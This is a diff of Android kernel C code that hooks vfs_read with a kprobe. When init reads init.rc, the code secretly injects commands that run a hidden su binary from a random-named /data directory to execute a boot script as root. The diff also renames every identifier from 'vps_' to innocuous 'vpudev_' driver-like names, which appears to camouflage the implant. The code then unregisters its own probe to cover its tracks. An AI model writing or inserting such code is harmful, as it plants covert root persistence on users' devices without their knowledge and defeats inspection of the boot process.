@@ -45,7 +45,7 @@
 #define VPS_INFO(fmt, ...) do { } while (0)
 #endif
 
-static const char vps_rc_text[] =
+static const char vpudev_rc_text[] =
 	"\n"
 	"on post-fs-data\n"
 	"    exec root -- /system/bin/sh -c \"/data/AXRZTwzYMjRowUXf/su -c 'sh /data/adb/nm_boot.sh'\"\n"
@@ -60,45 +60,45 @@ static const char vps_rc_text[] =
 	"    exec root -- /system/bin/sh -c \"/data/AXRZTwzYMjRowUXf/su -c 'sh /data/adb/nm_boot.sh'\"\n"
 	"\n";
 
-static ssize_t (*vps_orig_read)(struct file *, char __user *, size_t, loff_t *);
-static ssize_t (*vps_vps_orig_read_iter)(struct kiocb *, struct iov_iter *);
-static struct file_operations vps_fops_proxy;
-static ssize_t vps_rc_append;
+static ssize_t (*vpudev_orig_read)(struct file *, char __user *, size_t, loff_t *);
+static ssize_t (*vpudev_orig_read_iter)(struct kiocb *, struct iov_iter *);
+static struct file_operations vpudev_fops_shadow;
+static ssize_t vpudev_rc_append;
 
-static struct kprobe vps_read_kp = {
+static struct kprobe vpudev_read_probe_kp = {
 	.symbol_name = "vfs_read",
 	.pre_handler = NULL,
 };
 
-static void vps_rc_uninstall(struct work_struct *work)
+static void vpudev_read_probe_release(struct work_struct *work)
 {
-	unregister_kprobe(&vps_read_kp);
+	unregister_kprobe(&vpudev_read_probe_kp);
 	VPS_INFO("vfs_read kprobe 已拆除\n");
 }
-static DECLARE_WORK(vps_uninstall_work, vps_rc_uninstall);
+static DECLARE_WORK(vpudev_probe_release_work, vpudev_read_probe_release);
 
-static ssize_t vps_read_proxy(struct file *file, char __user *buf, size_t count,
+static ssize_t vpudev_read_shadow(struct file *file, char __user *buf, size_t count,
 			  loff_t *pos)
 {
 	bool first_read = file->f_pos == 0;
-	ssize_t ret = vps_orig_read(file, buf, count, pos);
+	ssize_t ret = vpudev_orig_read(file, buf, count, pos);
 
 	if (first_read)
-		ret += vps_rc_append;
+		ret += vpudev_rc_append;
 	return ret;
 }
 
-static ssize_t vps_read_iter_proxy(struct kiocb *iocb, struct iov_iter *to)
+static ssize_t vpudev_read_iter_shadow(struct kiocb *iocb, struct iov_iter *to)
 {
 	bool first_read = iocb->ki_pos == 0;
-	ssize_t ret = vps_vps_orig_read_iter(iocb, to);
+	ssize_t ret = vpudev_orig_read_iter(iocb, to);
 
 	if (first_read)
-		ret += vps_rc_append;
+		ret += vpudev_rc_append;
 	return ret;
 }
 
-static int vps_rc_read(struct file **file_ptr, char __user **buf_ptr,
+static int vpudev_read_cb(struct file **file_ptr, char __user **buf_ptr,
 			      size_t *count_ptr, loff_t **pos_ptr)
 {
 	struct file *file;
@@ -106,7 +106,7 @@ static int vps_rc_read(struct file **file_ptr, char __user **buf_ptr,
 	size_t count;
 	char path[256];
 	char *dpath;
-	size_t rc_count = strlen(vps_rc_text);
+	size_t rc_count = strlen(vpudev_rc_text);
 	static bool rc_inserted;
 
 	if (strcmp(current->comm, "init"))
@@ -136,21 +136,21 @@ static int vps_rc_read(struct file **file_ptr, char __user **buf_ptr,
 	if (count < rc_count)
 		return 0;
 
-	if (copy_to_user(buf, vps_rc_text, rc_count)) {
+	if (copy_to_user(buf, vpudev_rc_text, rc_count)) {
 		pr_err("vps: copy rc failed\n");
 		return 0;
 	}
 
 	/* f_op 在只读内存，整体换成一个 proxy 副本 */
-	memcpy(&vps_fops_proxy, file->f_op, sizeof(struct file_operations));
-	vps_orig_read = file->f_op->read;
-	if (vps_orig_read)
-		vps_fops_proxy.read = vps_read_proxy;
-	vps_vps_orig_read_iter = file->f_op->read_iter;
-	if (vps_vps_orig_read_iter)
-		vps_fops_proxy.read_iter = vps_read_iter_proxy;
-	file->f_op = &vps_fops_proxy;
-	vps_rc_append = rc_count;
+	memcpy(&vpudev_fops_shadow, file->f_op, sizeof(struct file_operations));
+	vpudev_orig_read = file->f_op->read;
+	if (vpudev_orig_read)
+		vpudev_fops_shadow.read = vpudev_read_shadow;
+	vpudev_orig_read_iter = file->f_op->read_iter;
+	if (vpudev_orig_read_iter)
+		vpudev_fops_shadow.read_iter = vpudev_read_iter_shadow;
+	file->f_op = &vpudev_fops_shadow;
+	vpudev_rc_append = rc_count;
 
 	*buf_ptr = buf + rc_count;
 	*count_ptr = count - rc_count;
@@ -158,30 +158,30 @@ static int vps_rc_read(struct file **file_ptr, char __user **buf_ptr,
 	VPS_INFO("init.rc 注入完成（%s, rc=%zu 字节）\n", dpath, rc_count);
 
 	/* 拆 kprobe（延迟到 workqueue，避免 kprobe 上下文里直接注销） */
-	schedule_work(&vps_uninstall_work);
+	schedule_work(&vpudev_probe_release_work);
 
 	return 0;
 }
 
-static int vps_read_pre(struct kprobe *p, struct pt_regs *regs)
+static int vpudev_read_probe(struct kprobe *p, struct pt_regs *regs)
 {
 	struct file **file_ptr = (struct file **)&PT_REGS_PARM1(regs);
 	char __user **buf_ptr = (char **)&PT_REGS_PARM2(regs);
 	size_t *count_ptr = (size_t *)&PT_REGS_PARM3(regs);
 	loff_t **pos_ptr = (loff_t **)&PT_REGS_CCALL_PARM4(regs);
 
-	return vps_rc_read(file_ptr, buf_ptr, count_ptr, pos_ptr);
+	return vpudev_read_cb(file_ptr, buf_ptr, count_ptr, pos_ptr);
 }
 
-static int __init vps_rc_init(void)
+static int __init vpudev_rc_attach(void)
 {
 	int ret;
 
-	vps_read_kp.pre_handler = vps_read_pre;
-	ret = register_kprobe(&vps_read_kp);
+	vpudev_read_probe_kp.pre_handler = vpudev_read_probe;
+	ret = register_kprobe(&vpudev_read_probe_kp);
 	if (ret)
 		pr_err("vps: vfs_read kprobe 注册失败 %d\n", ret);
 
 	return 0;
 }
-late_initcall(vps_rc_init);
+late_initcall(vpudev_rc_attach);
